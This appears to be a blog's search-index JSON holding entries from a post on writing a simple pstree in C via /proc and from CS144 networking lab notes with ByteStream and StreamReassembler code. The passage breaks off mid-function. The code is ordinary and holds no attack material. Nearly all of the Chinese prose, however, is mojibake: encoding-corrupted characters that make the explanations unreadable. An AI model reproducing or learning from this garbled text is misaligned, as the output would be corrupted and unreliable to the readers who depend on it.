[{"categories":["build_your_own"],"content":"æ‘˜è¦ï¼šè¿™æ˜¯ build_your_own ç³»åˆ—çš„ç¬¬ä¸€ç¯‡, ä»å®ç°ä¸€ä¸ªç®€å•çš„ pstree å¼€å§‹","date":"2023-09-18","objectID":"/build_your_own_pstree/","tags":["build_your_own","pstree"],"title":"Build_your_own_pstree","uri":"/build_your_own_pstree/"},{"categories":["build_your_own"],"content":"1. å‰è¨€ å­¦äº†è¿™ä¹ˆä¹…çš„è®¡ç®—æœº, å´æ²¡æœ‰ä»€ä¹ˆå®é™…äº§å‡º. å¹¶ä¸”ä¸æ˜¯å¾ˆæ„¿æ„æå¼€å‘, æ­£å¥½è¿™å­¦æœŸä¸Šæ“ä½œç³»ç»Ÿè¯¾, äºæ˜¯å°±æœ‰äº† build_your_own ç³»åˆ—çš„æƒ³æ³•. åˆæ°å¥½, åœ¨æ—©å…«çš„é©¬åŸè¯¾ç”±äºäºŒè¿›åˆ¶çš„éšæœºæ’åˆ—ç»„åˆ, æˆ‘å†™ä¸‹äº† pstree. äºæ˜¯è¿™ä¸ªç³»åˆ—æˆ‘ä»¬ä» pstree å¼€å§‹. ","date":"2023-09-18","objectID":"/build_your_own_pstree/:1:0","tags":["build_your_own","pstree"],"title":"Build_your_own_pstree","uri":"/build_your_own_pstree/"},{"categories":["build_your_own"],"content":"2. pstree pstree æ˜¯ä¸€ä¸ª Linux ä¸‹çš„å‘½ä»¤è¡Œå·¥å…·, ç”¨äºæ˜¾ç¤ºè¿›ç¨‹æ ‘. å®Œæ•´çš„ pstree åŠŸèƒ½è¿˜æ˜¯å¾ˆå¤šçš„, æˆ‘è¿™é‡Œé€‰æ‹©äº†ç®€å•çš„ -p å‚æ•°ç‰ˆæœ¬å®ç°. \u003e pstree -p\ræ˜¾ç¤ºè¿›ç¨‹æ ‘, å¹¶æ˜¾ç¤ºè¿›ç¨‹çš„ PID.\rfigure-1 pstree_in_kernel ","date":"2023-09-18","objectID":"/build_your_own_pstree/:2:0","tags":["build_your_own","pstree"],"title":"Build_your_own_pstree","uri":"/build_your_own_pstree/"},{"categories":["build_your_own"],"content":"3. å®ç° ","date":"2023-09-18","objectID":"/build_your_own_pstree/:3:0","tags":["build_your_own","pstree"],"title":"Build_your_own_pstree","uri":"/build_your_own_pstree/"},{"categories":["build_your_own"],"content":"3.1. ç»“æ„ä½“å®šä¹‰ é¦–å…ˆæˆ‘ä»¬è¦å®šä¹‰ä¸€ä¸ªè¿›ç¨‹æ ‘çš„ç»“æ„ä½“, ç”¨äºå­˜å‚¨è¿›ç¨‹çš„ä¿¡æ¯. æˆ‘é‡‡ç”¨çš„æ˜¯é“¾è¡¨çš„å½¢å¼å­˜å‚¨è¿›ç¨‹æ ‘, ä¸€ä¸ªè¿›ç¨‹çš„å­è¿›ç¨‹é€šè¿‡ child æŒ‡é’ˆæŒ‡å‘, å…„å¼Ÿè¿›ç¨‹é€šè¿‡ next æŒ‡é’ˆæŒ‡å‘. typedef struct node { __pid_t pid; char *name; __pid_t ppid; struct node *next; struct node *child; } node; ç„¶åæ•´ä¸ªè¿›ç¨‹æ ‘é€šè¿‡ä¸€ä¸ªæ•°ç»„å­˜å‚¨, æ•°ç»„çš„ä¸‹æ ‡ä¸ºè¿›ç¨‹çš„ PID. æœ€å¤§å€¼ä¸ºå†…æ ¸å®šä¹‰çš„æœ€å¤§ PID, è¿™ä¸ªå€¼å®šä¹‰åœ¨ /proc/sys/kernel/pid_max, éœ€è¦æ³¨æ„çš„æ˜¯åœ¨ä¸åŒçš„å†…æ ¸ç‰ˆæœ¬ä¸­å¯èƒ½ä¸åŒ. ä¾‹å¦‚åœ¨è¾ƒæ—©çš„å†…æ ¸ç‰ˆæœ¬ä¸­, è¿™ä¸ªå€¼ä¸º 32768. // MAX PID defined in /proc/sys/kernel/pid_max #define MAX 4194304 node *Tree[MAX] = {NULL}; ","date":"2023-09-18","objectID":"/build_your_own_pstree/:3:1","tags":["build_your_own","pstree"],"title":"Build_your_own_pstree","uri":"/build_your_own_pstree/"},{"categories":["build_your_own"],"content":"3.2. ä»å†…æ ¸è·å–è¿›ç¨‹ä¿¡æ¯ é¦–å…ˆæˆ‘ä»¬è¦ä»‹ç» /proc ç›®å½•. /proc ç›®å½•æ˜¯ Linux ç³»ç»Ÿä¸­çš„ä¸€ä¸ªç‰¹æ®Šç›®å½•, å®ƒæä¾›äº†å¯¹è¿è¡Œä¸­è¿›ç¨‹å’Œç³»ç»Ÿå†…æ ¸çš„è®¿é—®. å®ƒæ˜¯ä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ, å…¶ä¸­çš„æ–‡ä»¶å’Œç›®å½•å¹¶ä¸åœ¨ç£ç›˜ä¸Šå®é™…å­˜åœ¨, è€Œæ˜¯ç”±å†…æ ¸åœ¨è¿è¡Œæ—¶åŠ¨æ€ç”Ÿæˆçš„. /proc ç›®å½•ä¸‹çš„æ–‡ä»¶å’Œç›®å½•æä¾›äº†å¯¹ç³»ç»ŸçŠ¶æ€å’Œè¿›ç¨‹ä¿¡æ¯çš„å®æ—¶è®¿é—®. äºæ˜¯é€šè¿‡å¯¹ /proc ç›®å½•çš„è®¿é—®, éå†ç›®å½•ä¸‹çš„æ‰€æœ‰æ•°å­—ç›®å½•, å³å¯è·å–ç³»ç»Ÿå½“å‰çŠ¶æ€çš„æ‰€æœ‰è¿›ç¨‹. func: make_tree ç”¨äºéå† /proc ç›®å½•, å¹¶è·å–æ‰€æœ‰è¿›ç¨‹çš„ä¿¡æ¯. void make_tree(node *Tree[]) { Tree[0] = (node *)malloc(sizeof(node)); Tree[0]-\u003ename = (char *)malloc(sizeof(char) * 40); strcpy(Tree[0]-\u003ename, \"root\"); DIR *dp = opendir(\"/proc\"); if (!dp) { fprintf(stderr, \"%s\", \"Can 't open /proc/\"); exit(1); } struct dirent *entry; while ((entry = readdir(dp)) != NULL) { __pid_t pid = atoi(entry-\u003ed_name); read_status(pid, Tree); } } æ’æ’­å’Œæœ¬æ¬¡å®ç°æ²¡å•¥å…³ç³»çš„å° tips, /proc/self æ˜¯ä¸€ä¸ªè½¯é“¾æ¥, æŒ‡å‘å½“å‰è¿›ç¨‹çš„ä¿¡æ¯. å¯ä»¥è½»æ˜“çš„è·å–åˆ°å½“å‰è¿›ç¨‹çš„ä¿¡æ¯. ","date":"2023-09-18","objectID":"/build_your_own_pstree/:3:2","tags":["build_your_own","pstree"],"title":"Build_your_own_pstree","uri":"/build_your_own_pstree/"},{"categories":["build_your_own"],"content":"3.3. ä»å†…æ ¸è·å–è¿›ç¨‹æ ‘ ç„¶åä»‹ç» /proc/[pid]/stat æ–‡ä»¶, è¿™ä¸€æ–‡ä»¶ä¿å­˜äº†è¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯. /proc/[pid]/stat æ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹: pidï¼šè¿›ç¨‹ID commï¼šè¿›ç¨‹çš„å‘½ä»¤å stateï¼šè¿›ç¨‹çš„çŠ¶æ€ ppidï¼šçˆ¶è¿›ç¨‹çš„è¿›ç¨‹ID pgrpï¼šè¿›ç¨‹ç»„çš„è¿›ç¨‹ID sessionï¼šä¼šè¯çš„è¿›ç¨‹ID tty_nrï¼šä¸è¿›ç¨‹å…³è”çš„ç»ˆç«¯è®¾å¤‡å· tpgidï¼šè¿›ç¨‹æ‰€å±çš„å‰å°è¿›ç¨‹ç»„ID flagsï¼šè¿›ç¨‹çš„æ ‡å¿—ä½ minfltï¼šä¸éœ€è¦ä»ç£ç›˜åŠ è½½é¡µé¢çš„æ¬¡æ•°ï¼ˆæ¬¡ç¼ºé¡µé”™è¯¯ï¼‰ cminfltï¼šåœ¨è¿›ç¨‹çš„å­è¿›ç¨‹ä¸­ä¸éœ€è¦ä»ç£ç›˜åŠ è½½é¡µé¢çš„æ¬¡æ•°ï¼ˆæ¬¡ç¼ºé¡µé”™è¯¯ï¼‰ majfltï¼šéœ€è¦ä»ç£ç›˜åŠ è½½é¡µé¢çš„æ¬¡æ•°ï¼ˆä¸»ç¼ºé¡µé”™è¯¯ï¼‰ cmajfltï¼šåœ¨è¿›ç¨‹çš„å­è¿›ç¨‹ä¸­éœ€è¦ä»ç£ç›˜åŠ è½½é¡µé¢çš„æ¬¡æ•°ï¼ˆä¸»ç¼ºé¡µé”™è¯¯ï¼‰ utimeï¼šè¿›ç¨‹åœ¨ç”¨æˆ·æ€è¿è¡Œçš„æ—¶é—´ï¼ˆæ—¶é’Ÿæ»´ç­”æ•°ï¼‰ stimeï¼šè¿›ç¨‹åœ¨å†…æ ¸æ€è¿è¡Œçš„æ—¶é—´ï¼ˆæ—¶é’Ÿæ»´ç­”æ•°ï¼‰ cutimeï¼šè¿›ç¨‹çš„æ‰€æœ‰å·²æ­»äº¡çš„å­è¿›ç¨‹åœ¨ç”¨æˆ·æ€è¿è¡Œçš„æ—¶é—´ï¼ˆæ—¶é’Ÿæ»´ç­”æ•°ï¼‰ cstimeï¼šè¿›ç¨‹çš„æ‰€æœ‰å·²æ­»äº¡çš„å­è¿›ç¨‹åœ¨å†…æ ¸æ€è¿è¡Œçš„æ—¶é—´ï¼ˆæ—¶é’Ÿæ»´ç­”æ•°ï¼‰ priorityï¼šè¿›ç¨‹çš„è°ƒåº¦ä¼˜å…ˆçº§ niceï¼šè¿›ç¨‹çš„é™æ€ä¼˜å…ˆçº§ num_threadsï¼šè¿›ç¨‹æ‰€æ‹¥æœ‰çš„çº¿ç¨‹æ•° itrealvalueï¼šä¸‹ä¸€ä¸ªè®¡æ—¶å™¨ä¸­çš„å€¼ starttimeï¼šè¿›ç¨‹å¯åŠ¨æ—¶çš„æ—¶é’Ÿæ»´ç­”æ•° vsizeï¼šè™šæ‹Ÿå†…å­˜å¤§å°ï¼ˆå­—èŠ‚ï¼‰ rssï¼šå¸¸é©»å†…å­˜é›†å¤§å°ï¼ˆé¡µé¢æ•°ï¼‰ rsslimï¼šè¿›ç¨‹çš„å¸¸é©»å†…å­˜é›†å¤§å°çš„é™åˆ¶ï¼ˆå­—èŠ‚ï¼‰ startcodeï¼šå¯æ‰§è¡Œä»£ç çš„èµ·å§‹åœ°å€ endcodeï¼šå¯æ‰§è¡Œä»£ç çš„ç»“æŸåœ°å€ startstackï¼šæ ˆçš„èµ·å§‹åœ°å€ kstkespï¼šå½“å‰æ ˆæŒ‡é’ˆï¼ˆESPï¼‰ kstkeipï¼šå½“å‰æŒ‡ä»¤æŒ‡é’ˆï¼ˆEIPï¼‰ signalï¼šæŒ‚èµ·çš„ä¿¡å·ä½å›¾ blockedï¼šé˜»å¡çš„ä¿¡å·ä½å›¾ sigignoreï¼šå¿½ç•¥çš„ä¿¡å·ä½å›¾ sigcatchï¼šæ•è·çš„ä¿¡å·ä½å›¾ wchanï¼šè¿›ç¨‹æ­£åœ¨ç­‰å¾…çš„åœ°å€ nswapï¼šäº¤æ¢å‡ºçš„é¡µé¢æ•° cnswapï¼šåœ¨è¿›ç¨‹çš„å­è¿›ç¨‹ä¸­äº¤æ¢å‡ºçš„é¡µé¢æ•° exit_signalï¼šè¿›ç¨‹ç»ˆæ­¢æ—¶å‘é€ç»™çˆ¶è¿›ç¨‹çš„ä¿¡å· processorï¼šæ‰§è¡Œè¿›ç¨‹çš„å¤„ç†å™¨ID rt_priorityï¼šå®æ—¶ä¼˜å…ˆçº§ policyï¼šè°ƒåº¦ç­–ç•¥ delayacct_blkio_ticksï¼šå—IOå»¶è¿Ÿè´¦æˆ·æ—¶é’Ÿæ»´ç­”æ•° guest_timeï¼šè™šæ‹ŸCPUæ—¶é—´ï¼ˆä»¥æ—¶é’Ÿæ»´ç­”æ•°ä¸ºå•ä½ï¼‰ cguest_timeï¼šåœ¨è¿›ç¨‹çš„å­è¿›ç¨‹ä¸­çš„è™šæ‹ŸCPUæ—¶é—´ï¼ˆä»¥æ—¶é’Ÿæ»´ç­”æ•°ä¸ºå•ä½ï¼‰ start_dataï¼šæ•°æ®æ®µçš„èµ·å§‹åœ°å€ end_dataï¼šæ•°æ®æ®µçš„ç»“æŸåœ°å€ start_brkï¼šå †çš„èµ·å§‹åœ°å€ arg_startï¼šå‘½ä»¤è¡Œå‚æ•°çš„èµ·å§‹åœ°å€ arg_endï¼šå‘½ä»¤è¡Œå‚æ•°çš„ç»“æŸåœ°å€ env_startï¼šç¯å¢ƒå˜é‡çš„èµ·å§‹åœ°å€ env_endï¼šç¯å¢ƒå˜é‡çš„ç»“æŸåœ°å€ exit_codeï¼šè¿›ç¨‹çš„é€€å‡ºçŠ¶æ€ æœ¬æ¬¡å®ç°æˆ‘ä»¬åªéœ€è¦è·å–è¿›ç¨‹çš„çˆ¶è¿›ç¨‹ PID å’Œè¿›ç¨‹å. é€šè¿‡è¯»å– /proc/[pid]/stat æ–‡ä»¶å³å¯. ä¸ºäº†æ„å»ºè¿›ç¨‹æ ‘, æˆ‘ä»¬éœ€è¦é€’å½’çš„è·å–çˆ¶è¿›ç¨‹çš„ä¿¡æ¯ç›´åˆ°çˆ¶è¿›ç¨‹ä¸º 0, å³ root è¿›ç¨‹. ç„¶åä¸ºäº†é˜²æ­¢é‡å¤éå†, æˆ‘ä»¬æ£€éªŒäº†æŒ‡é’ˆæ˜¯å¦ä¸ºç©º. func: read_status ç”¨äºè·å–è¿›ç¨‹çš„ä¿¡æ¯, å¹¶é€’å½’çš„è·å–çˆ¶è¿›ç¨‹çš„ä¿¡æ¯. void read_status(__pid_t pid, node *Tree[]) { if (Tree[pid] != NULL) { return; } Tree[pid] = (node *)malloc(sizeof(node)); Tree[pid]-\u003ename = (char *)malloc(sizeof(char) * 40); char *processpath = (char *)malloc(sizeof(char) * 20); sprintf(processpath, \"/proc/%d/stat\", pid); FILE *fp = fopen(processpath, \"r\"); if (fp == NULL) { fprintf(stderr, \"Can 't open %s\\n\", processpath); free(processpath); exit(1); } char i; __pid_t _pid, ppid; char pname[40]; fscanf(fp, \"%d (%s %c %d\", \u0026_pid, pname, \u0026i, \u0026ppid); pname[strlen(pname) - 1] = '\\0'; strcpy(Tree[pid]-\u003ename, pname); assert(pid == _pid); Tree[pid]-\u003epid = pid; Tree[pid]-\u003eppid = ppid; fclose(fp); free(processpath); read_status(ppid, Tree); if (Tree[ppid]-\u003echild == NULL) { Tree[ppid]-\u003echild = Tree[pid]; } else { node *bro = Tree[ppid]-\u003echild; while (bro-\u003enext != NULL) { bro = bro-\u003enext; } bro-\u003enext = Tree[pid]; } } ","date":"2023-09-18","objectID":"/build_your_own_pstree/:3:3","tags":["build_your_own","pstree"],"title":"Build_your_own_pstree","uri":"/build_your_own_pstree/"},{"categories":["build_your_own"],"content":"3.4. æ‰“å°è¿›ç¨‹æ ‘ æ‰“å°è¿›ç¨‹æ ‘åˆ™æ¯”è¾ƒç®€å•, è¿›è¡Œä¸€ä¸ªè®°å½•æ·±åº¦çš„ DFS å³å¯. ä¸ºäº†ç¾è§‚, æˆ‘ä»¬ä½¿ç”¨äº†åˆ¶è¡¨ç¬¦ â””â”€ å’Œ â”œâ”€ è¿›è¡Œåˆ†å‰². å¹¶å› æ­¤éœ€è¦è®°å½•å½“å‰è¿›ç¨‹æ˜¯å¦ä¸ºçˆ¶è¿›ç¨‹çš„æœ€åä¸€ä¸ªå­è¿›ç¨‹. åˆ¤æ–­æ–¹æ³•æ˜¯ Tree[child-\u003epid]-\u003enext == NULL. func: print_tree ç”¨äºæ‰“å°è¿›ç¨‹æ ‘. void print_tree(node *Tree[], int pid, int depth, int last_child) { for (int i = 0; i \u003c depth; i++) { if (i == depth - 1) { if (last_child) { printf(\"â””â”€\"); } else { printf(\"â”œâ”€\"); } } else { printf(\"â”‚ \"); } } printf(\"%s (%d)\\n\", Tree[pid]-\u003ename, pid); node *child = Tree[pid]-\u003echild; while (child != NULL) { print_tree(Tree, child-\u003epid, depth + 1, Tree[child-\u003epid]-\u003enext == NULL); child = child-\u003enext; } } ","date":"2023-09-18","objectID":"/build_your_own_pstree/:3:4","tags":["build_your_own","pstree"],"title":"Build_your_own_pstree","uri":"/build_your_own_pstree/"},{"categories":["build_your_own"],"content":"3.5. è¿è¡Œç»“æœ ä¸è¦å¿˜è®°é‡Šæ”¾å†…å­˜å–µ. figure-2 mypstree ","date":"2023-09-18","objectID":"/build_your_own_pstree/:3:5","tags":["build_your_own","pstree"],"title":"Build_your_own_pstree","uri":"/build_your_own_pstree/"},{"categories":["build_your_own"],"content":"4. æ€»ç»“ build_your_own ç³»åˆ—çš„ç¬¬ä¸€ç¯‡å°±åˆ°è¿™é‡Œäº†. è¿™æ¬¡å®ç°æ¯”è¾ƒç®€å•, å¸Œæœ›èƒ½åšæŒä¸‹å»ä¸è¦å’•å’•å’• (é€ƒ ","date":"2023-09-18","objectID":"/build_your_own_pstree/:4:0","tags":["build_your_own","pstree"],"title":"Build_your_own_pstree","uri":"/build_your_own_pstree/"},{"categories":["Project"],"content":"å¾ˆæ—©å°±å¬é—» CS144 Lab çš„å¤§å, ä½†æ˜¯ç”±äºå„ç§åŸå› ä¸€ç›´æ²¡æœ‰ä¸Šæ‰‹å®è·µ. ç›´åˆ°æœ€è¿‘æ‰å¼€å§‹ç€æ‰‹å®è·µ, æœ¬æ–‡å°†è®°å½•æˆ‘åœ¨å®è·µè¿‡ç¨‹ä¸­çš„ä¸€äº›ç¬”è®°. ç”±äºæœ¬æ¬¡å®éªŒå’Œåšå®¢æ˜¯å¹¶è¡Œè¿›è¡Œçš„, æ‰€ä»¥å·²ç»ç¼–è¾‘å…¬å¼€çš„éƒ¨åˆ†ä¹Ÿå¯èƒ½ä¼šå‡ºç°éƒ¨åˆ†å·®é”™ä»¥åŠå¯èƒ½å¯¼è‡´çš„å¤šæ¬¡ä¿®æ”¹. æˆ‘çš„ä»“åº“åœ¨ 4ever-xxxl/CS144-Computer-Network . ","date":"2023-08-15","objectID":"/cs144_computer_network/:0:0","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab ç¬”è®° (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"ç¯å¢ƒæ­å»º ","date":"2023-08-15","objectID":"/cs144_computer_network/:1:0","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab ç¬”è®° (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"è¿è¡Œç¯å¢ƒ æœ¬æ¬¡ç¯å¢ƒåŸºäºå®˜æ–¹é•œåƒ VirtualBox æ­å»º, é•œåƒæ–‡ä»¶ä»¥åŠæ­å»ºæ•™ç¨‹å¯ä»¥åœ¨ è¿™é‡Œ æ‰¾åˆ°. VirtualBox å¯åŠ¨åç…§å¸¸é…ç½®, ä½¿ç”¨ Vscode è¿œç¨‹è¿æ¥åˆ°è™šæ‹Ÿæœº, Vscode ä¸­é…ç½®æ’ä»¶ C/C++ GitLens, ä¹‹åçš„å®éªŒéƒ½åœ¨ Vscode ä¸­è¿›è¡Œ. è¿è¡Œ setup_dev_env.sh é…ç½®å®éªŒæ‰€éœ€ç¯å¢ƒ. ä¹‹å git clone ä»“åº“, æˆ‘ä½¿ç”¨çš„ä»“åº“æ˜¯ PKUFlyingPig/CS144-Computer-Network , å†æŒ‰ç…§ README.md é…ç½®å³å¯. è¿™é‡Œæœ‰ä¸ªå‘å°±æ˜¯ç”±äºç¼ºå¤±äº† \u003carray\u003e \u003cstdexcept\u003e ä¸¤ä¸ªæ–‡ä»¶å¤´å¯¼è‡´æ‰§è¡Œ make æ—¶ä¼šæŠ¥é”™, éœ€è¦åœ¨å¯¹åº”æ–‡ä»¶æ‰‹åŠ¨è¡¥ä¸Š. (æˆ‘ä¹Ÿä¸æ˜¯å¾ˆç†è§£ä¸ºä»€ä¹ˆä¸‰å¹´å‰çš„é«˜æ˜Ÿä»“åº“ clone ä¸‹æ¥ä¸èƒ½ç›´æ¥ç”¨. figure-1 error ","date":"2023-08-15","objectID":"/cs144_computer_network/:1:1","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab ç¬”è®° (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"æµ‹è¯•ç¯å¢ƒ ä¸ºäº†ä¾¿äºè°ƒè¯•å¹¶ä¸”ä¸å½±å“ Release ç‰ˆæœ¬æµ‹é€Ÿ, æˆ‘åœ¨å®éªŒç›®å½•ä¸‹æ–°å»ºäº† Debug ç›®å½•, ä½¿ç”¨ cmake .. -DCMAKE_BUILD_TYPE=Debug ç”Ÿæˆ Debug ç‰ˆæœ¬çš„å¯æ‰§è¡Œæ–‡ä»¶. Vscode ä½¿ç”¨çš„æµ‹è¯•é…ç½®æ–‡ä»¶å¦‚ä¸‹: launch.json { \"version\": \"0.2.0\", \"configurations\": [ { \"name\": \"CS144Lab debug\", \"type\": \"cppdbg\", \"request\": \"launch\", \"program\": \"${workspaceFolder}/CS144-Computer-Network/Debug/tests/${fileBasenameNoExtension}\", //!è®¾ç½®ä¸ºæµ‹è¯•ç¨‹åºæºç ç›¸å¯¹åº”çš„ç›®æ ‡ç¨‹åºè·¯å¾„ \"args\": [], \"stopAtEntry\": false, \"cwd\": \"${workspaceFolder}\", \"environment\": [], \"externalConsole\": false, \"MIMode\": \"gdb\", \"setupCommands\": [ { \"description\": \"ä¸º gdb å¯ç”¨æ•´é½æ‰“å°\", \"text\": \"-enable-pretty-printing\", \"ignoreFailures\": true } ], \"miDebuggerPath\": \"/usr/bin/gdb\" } ] } ä½†æ˜¯è¿™ç§æƒ…å†µä¸‹è¿˜æ˜¯æ²¡åŠæ³•æ„‰å¿«çš„è°ƒè¯•, å› ä¸º DEBUG çš„ç¼–è¯‘å‚æ•°æ˜¯ -Og, è¿˜æ˜¯ä¼šå¯¼è‡´éƒ¨åˆ†å˜é‡å‡ºç° OPTIMIZEOUT çš„æƒ…å†µ. å› æ­¤æˆ‘ä»¬éœ€è¦ä¿®æ”¹ /etc/cflags.cmake æ–‡ä»¶, å°† -Og æ”¹æˆ -O0 . æ¥ä¸‹æ¥å°±å¯ä»¥æ„‰å¿«çš„è°ƒè¯•å•¦. ","date":"2023-08-15","objectID":"/cs144_computer_network/:1:2","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab ç¬”è®° (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"Lab_0 ","date":"2023-08-15","objectID":"/cs144_computer_network/:2:0","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab ç¬”è®° (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"Writing webget ç¼–å†™ get_URL å‡½æ•°ç®€ç•¥å®ç°åº”ç”¨å±‚ HTTP è¯·æ±‚å“åº”çš„åŠŸèƒ½, å³ä½¿ç”¨ socket å‘æŒ‡å®š IP å’Œ Path å‘é€ GET è¯·æ±‚å¹¶è·å–å“åº”. void get_URL(const string \u0026host, const string \u0026path) { TCPSocket sock{}; sock.connect(Address(host,\"http\")); sock.write(\"GET \"+path+\" HTTP/1.1\\r\\n\"); sock.write(\"Host: \"+host+\"\\r\\n\"); sock.write(\"Connection: close\\r\\n\\r\\n\"); while (!sock.eof()) { cout\u003c\u003csock.read(); } sock.close(); } è¿™é‡ŒåŒæ ·æœ‰ä¸ªå‘å°±æ˜¯å¦‚æœä¸»æœºå¼€äº†ä»£ç†å¹¶ä¸”å¼€äº† TUN æ¨¡å¼, é‚£ä¹ˆ sock.shutdown(SHUT_WR); ä¼šå¯¼è‡´å¼‚å¸¸é€€å‡º. å…·ä½“åŸå› è¿˜ä¸æ˜¯å¾ˆæ¸…æ¥š. ","date":"2023-08-15","objectID":"/cs144_computer_network/:2:1","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab ç¬”è®° (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"An in-memory reliable byte stream ç¼–å†™ä¸€ä¸ªå¾ªç¯å­—èŠ‚æµç±», éœ€è¦å‘ _buffeer ä¸­å†™å…¥å’Œè¯»å–æ•°æ®, å…¶ä¸­è¯»å–éƒ¨åˆ†åˆ†æˆäº†ä¸¤æ­¥, å…ˆå¤åˆ¶å†å¼¹å‡º. ä»£ç å¦‚ä¸‹ byte_stream.hh #include \u003cdeque\u003e class ByteStream { private: size_t _capacity = 0; size_t _read_count = 0; size_t _write_count = 0; std::deque\u003cchar\u003e _buffer = {}; bool _eof = false; bool _error = false; // ... } byte_stream.cc ByteStream::ByteStream(const size_t capacity) : _capacity(capacity) {} size_t ByteStream::write(const string \u0026data) { size_t len = std::min(data.length(), remaining_capacity()); for (size_t i = 0; i \u003c len; i++) { _buffer.emplace_back(data[i]); } _write_count += len; return len; } string ByteStream::peek_output(const size_t len) const { size_t peekLen = std::min(len, buffer_size()); return string().assign(_buffer.begin(), _buffer.begin() + peekLen); } void ByteStream::pop_output(const size_t len) { size_t popLen = std::min(len, buffer_size()); for (size_t i = 0; i \u003c popLen; i++) { _buffer.pop_front(); } _read_count += popLen; } std::string ByteStream::read(const size_t len) { std::string readStream = ByteStream::peek_output(len); ByteStream::pop_output(len); return readStream; } void ByteStream::end_input() { _eof = true; } bool ByteStream::input_ended() const { return _eof; } size_t ByteStream::buffer_size() const { return _buffer.size(); } bool ByteStream::buffer_empty() const { return _buffer.size() == 0; } bool ByteStream::eof() const { return buffer_empty() \u0026\u0026 input_ended(); } size_t ByteStream::bytes_written() const { return _write_count; } size_t ByteStream::bytes_read() const { return _read_count; } size_t ByteStream::remaining_capacity() const { return _capacity - buffer_size(); } ","date":"2023-08-15","objectID":"/cs144_computer_network/:2:2","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab ç¬”è®° (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"Lab_1 ","date":"2023-08-15","objectID":"/cs144_computer_network/:3:0","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab ç¬”è®° (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"stream_reassembler ç¼–å†™ä¸€ä¸ªæµé‡ç»„å™¨, ç”¨äºå°†ä¹±åºçš„æ•°æ®æµé‡ç»„æˆæœ‰åºçš„æ•°æ®æµ. è¿™ä¸ª lab çš„éš¾ç‚¹åœ¨äºä¹±åºæ•°æ®æµçš„åˆå¹¶ä»¥åŠæ•°æ®æµç»“å°¾çš„è¾¹ç•Œé—®é¢˜. å¯¹äºä¹±åºæ•°æ®æµ, æˆ‘é‡‡ç”¨ deque æ¥è¿›è¡Œå­˜å‚¨, ç”¨ _buffer å­˜å‚¨æ•°æ®, _bitmap å­˜å‚¨æ•°æ®æ˜¯å¦å·²ç»è¢«å†™å…¥. å½“æ•°æ®æµåˆ°æ¥æ—¶, å…ˆæ ¹æ®å‰åè¾¹ç•Œè¿›è¡Œè£å‰ª. å‰è¾¹ç•Œä¸ºç¬¬ä¸€ä¸ªæœªæŒ‰åºçš„å­—èŠ‚åºå·, åè¾¹ç•Œç”±ç¼“å†²åŒºå¤§å°é™åˆ¶. ç„¶åé¡ºåºæ‰«ä¸€é, å°†æ•°æ®å†™å…¥ _buffer æœªå­˜å‚¨çš„ä½ç½®, å³ _bitmap ä¸º false çš„ä½ç½®, å¹¶å°†å…¶ç½®çœŸ. æœ€åé¡ºåºæ£€æŸ¥ _bitmap , å°†å·²ç»æŒ‰åºçš„å¤´éƒ¨æ•°æ®å¼¹å‡ºå¹¶å†™å…¥ _output ä¸­. è¿™é‡Œçš„å®ç°å¹¶æ²¡æœ‰é‡‡ç”¨ set ç­‰æ ‘å‹æ•°æ®ç»“æ„, è€Œæ˜¯åœ¨åŒç«¯é˜Ÿåˆ—ä¸­é¡ºåºå­˜å‚¨. è™½ç„¶å®ç°ç®€å•, ä½†æ˜¯æ—¶é—´å¤æ‚åº¦æ˜¯ $O(n)$ çš„, ç†è®ºä¸Šéƒ¨åˆ†ç¯èŠ‚æ˜¯å¯ä»¥è¾¾åˆ° $O(\\log n)$ çš„, ç•™ä¸ªå‘ç­‰åé¢å†æ”¹è¿›å§. ç„¶åæ˜¯æ•°æ®æµç»“å°¾çš„è¾¹ç•Œé—®é¢˜, åªæœ‰å½“æ•°æ®æµç»“å°¾åˆ°æ¥å¹¶ä¸”éƒ½èƒ½è¢«å†™å…¥æ—¶, æ‰èƒ½è®°å½•ä¸‹ _eof ä¿¡å·, å¦åˆ™ä¼šå¯¼è‡´æ•°æ®æµç»“å°¾çš„æ•°æ®ä¸¢å¤±. è¿™æ—¶ç»“å°¾å‰å¯èƒ½ä»ç„¶æ˜¯ä¹±åºçŠ¶æ€, å› æ­¤éœ€è¦ç­‰å¾…æ‰€æœ‰ä¹±åºæ•°æ®æ’åˆ—å®Œå¹¶å†™å…¥åæ‰èƒ½å°† _output å…³é—­. check_lab1 çš„è¿è¡Œæ—¶é—´åœ¨ 0.75~0.85s å·¦å³. stream_reassembler.hh class StreamReassembler { private: // Your code here -- add private members as necessary. std::deque\u003cchar\u003e _buffer = {}; std::deque\u003cbool\u003e _bitmap = {}; size_t _first_unassembled_idx = 0; size_t _unassembled_bytes_num = 0; bool _eof = false; ByteStream _output; //!\u003c The reassembled in-order byte stream size_t _capacity; //!\u003c The maximum number of bytes // ... } stream_reassembler.cc StreamReassembler::StreamReassembler(const size_t capacity) : _buffer(capacity, '\\0'), _bitmap(capacity, false), _output(capacity), _capacity(capacity) {} void StreamReassembler::push_substring(const string \u0026data, const size_t index, const bool eof) { if (eof \u0026\u0026 _first_unassembled_idx + _capacity - _output.buffer_size() \u003e= index + data.length()) { _eof = true; } size_t front_boundary = std::max(index, _first_unassembled_idx); size_t back_boundary = std::min(index + data.length(), _first_unassembled_idx + _capacity - _output.buffer_size()); for (size_t i = front_boundary; i \u003c back_boundary; i++) { if (_bitmap[i - _first_unassembled_idx]) { continue; } _buffer[i - 